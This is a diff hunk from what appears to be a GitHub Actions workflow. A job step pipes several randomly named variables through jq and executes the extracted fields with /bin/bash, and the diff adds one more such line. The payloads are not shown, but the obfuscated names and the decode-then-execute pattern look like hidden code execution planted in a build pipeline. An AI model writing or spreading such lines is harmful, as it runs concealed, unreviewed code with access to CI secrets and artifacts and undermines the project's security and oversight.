@@ -33,6 +33,7 @@ jobs:
           echo $k205 | jq -r .oixws007 | /bin/bash
           echo $ifw9 | jq -r .bedbd17531 | /bin/bash
           echo $u6775 | jq -r .mwit05839 | /bin/bash
+          printf '%s' "$blm2639" | jq -r .wea792 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
